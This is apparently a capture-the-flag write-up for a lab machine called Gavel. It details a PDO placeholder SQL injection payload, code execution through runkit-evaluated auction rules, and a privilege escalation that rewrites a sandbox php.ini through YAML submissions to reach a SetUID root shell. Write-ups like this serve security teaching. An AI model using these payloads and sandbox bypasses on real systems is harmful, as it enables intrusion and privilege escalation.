## inventory.php — SQL Injection

The sorting functionality in `inventory.php` is implemented dangerously:

```php
$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
$col = "`" . str_replace("`", "", $sortItem) . "`";

// Later:
$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
$stmt->execute([$userId]);
```

The `$col` variable is interpolated directly into the SQL string after only stripping backticks. This is a known PDO vulnerability pattern: injecting a `?` creates an extra parameter placeholder, allowing escape from backtick-quoted identifiers.

## bid_handler.php — RCE via Runkit

```php
$rule = $auction['rule'];
$rule_message = $auction['message'];

$allowed = false;

try {
    if (function_exists('ruleCheck')) {
        runkit_function_remove('ruleCheck');
    }
    runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
    error_log("Rule: " . $rule);
    $allowed = ruleCheck($current_bid, $previous_bid, $bidder);
} catch (Throwable $e) {
    error_log("Rule error: " . $e->getMessage());
    $allowed = false;
}

if (!$allowed) {
    echo json_encode(['success' => false, 'message' => $rule_message]);
    exit;
}
```

`runkit_function_add()` creates a PHP function from a database-stored rule string and executes it. If I can modify auction rules (via admin panel), this is arbitrary code execution.

# Database Access via SQL Injection

## The Injection Vector

The vulnerable code:

```php
$col = "`" . str_replace("`", "", $sortItem) . "`";
$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
```

The technique: inject a `?` into `sort` to create an extra placeholder, then use the `user_id` parameter to break out of the backticks.

Payload structure:

```
sort=\?;--+-&user_id=x` FROM (SELECT <payload> AS `'x`)y;-- -
```

The `\` before `?` escapes the backtick that wraps the column name, the `?` becomes an extra PDO placeholder, and the `user_id` parameter flows into the injection.

## Reverse Engineering gavel-util

- Connects to UNIX socket `/var/run/gaveld.sock`
- Sends JSON with `op`, `content_length`, and YAML payload
- `submit` command sends the YAML after a JSON header

## Reverse Engineering gaveld

`gaveld`:

- Creates `/opt/gavel/submission`
- Listens on `/var/run/gaveld.sock`, ownership `root:gavel-seller`
- Forks per connection, verifies peer is in `gavel-seller` group
- Handles `submit`, `stats`, `invoice`

For `submit`:

- Reads up to 2MB YAML
- Parses with libyaml, validates keys
- Calls `php_safe_run()` to validate `rule` against a restrictive `php.ini`

The `php.ini` is at `/opt/gavel/.config/php/php.ini`:

```
engine=On
open_basedir=/opt/gavel
disable_functions=exec,shell_exec,system,passthru,popen,proc_open,...
allow_url_fopen=Off
```

Notably, `file_put_contents` is **not** disabled.

## The php.ini Bypass

`php_safe_run` executes PHP with `-n -c /opt/gavel/.config/php/php.ini -r <sandbox code>`.

Since `file_put_contents` is allowed, I can overwrite the `php.ini` itself.

## First Payload — Overwrite php.ini

Create YAML:

```yaml
name: "replace ini"
description: "pwn step 1"
image: "https://0xdf.gitlab.io/image.png"
price: 100000
rule_msg: "oops, new php.ini"
rule: "file_put_contents('/opt/gavel/.config/php/php.ini', \"engine=On\\nopen_basedir=\\ndisable_functions=\\n\"); return false;"
```

Submit:

```bash
auctioneer@gavel:/dev/shm$ gavel-util submit ini.yaml
Item submitted for review in next auction
```

Now `php.ini` is empty of restrictions:

```bash
auctioneer@gavel:/dev/shm$ cat /opt/gavel/.config/php/php.ini
engine=On
open_basedir=
disable_functions=
```

## Alternative — RULE_PATH Environment Variable

In `gaveld` reverse engineering, I also noticed it checks for `RULE_PATH` environment variable and uses that `php.ini` if provided.

So I could have done:

```bash
auctioneer@gavel:~$ cat > /dev/shm/php.ini
engine=On
open_basedir=
disable_functions=
```

```bash
auctioneer@gavel:~$ RULE_PATH=/dev/shm/php.ini gavel-util submit setuid.yaml
```

This would also work without overwriting the original.

# Beyond Root — PrivateTmp

During the process, I tried writing to `/tmp`, but the file wasn't visible from the www-data shell. The reason: Apache uses `PrivateTmp=true`, so the process spawned from the web server sees a private `/tmp` mount. The `gaveld` daemon runs outside that namespace and writes to the real `/tmp`. With root, I could see it:

```bash
root@gavel:/tmp# ls
0xdf  systemd-private-...-apache2.service-...
```

This is why placing the SetUID bash in `/home/auctioneer` was safer.
